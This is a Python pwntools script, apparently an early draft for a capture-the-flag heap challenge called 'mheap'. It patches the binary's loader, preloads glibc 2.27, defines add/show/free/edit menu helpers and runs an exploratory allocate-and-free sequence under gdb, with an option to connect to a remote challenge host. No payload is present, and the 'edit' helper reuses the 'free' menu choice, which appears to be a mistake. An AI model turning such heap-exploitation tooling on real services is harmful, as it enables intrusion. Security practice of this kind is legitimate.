from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

def add(idx, size, content):
    p.recvuntil('choice')
    p.sendline('1')
    p.recvuntil('Index')
    p.sendline(str(idx))
    p.recvuntil('size')
    p.sendline(str(size))
    p.recvuntil('Content')
    p.send(content)

def show(idx):
    p.recvuntil('choice')
    p.sendline('2')
    p.recvuntil('Index')
    p.sendline(str(idx))

def free(idx):
    p.recvuntil('choice')
    p.sendline('3')
    p.recvuntil('Index')
    p.sendline(str(idx))

def edit(idx, content):
    p.recvuntil('choice')
    p.sendline('3')
    p.recvuntil('Index')
    p.sendline(str(idx))
    p.send(content)

debug = 1
if debug == 1:
	elf = change_ld('./mheap', './ld-2.27.so')
	p = elf.process(env={'LD_PRELOAD':'./libc-2.27.so'})
else:
	p = remote('112.126.98.5', 9999)

add(0, 0x20, 'A' * 0x20)
add(1, 0x20, 'A' * 0x20)
free(0)
free(1)

gdb.attach(p)
add(0, 0x20, 'B' * 0x20)
add(1, 0x20, 'B' * 0x20)
free(0)
free(1)

gdb.attach(p)
add(0, 0x20, 'B' * 0x20)
add(1, 0x20, 'B' * 0x20)
gdb.attach(p)
p.interactive()
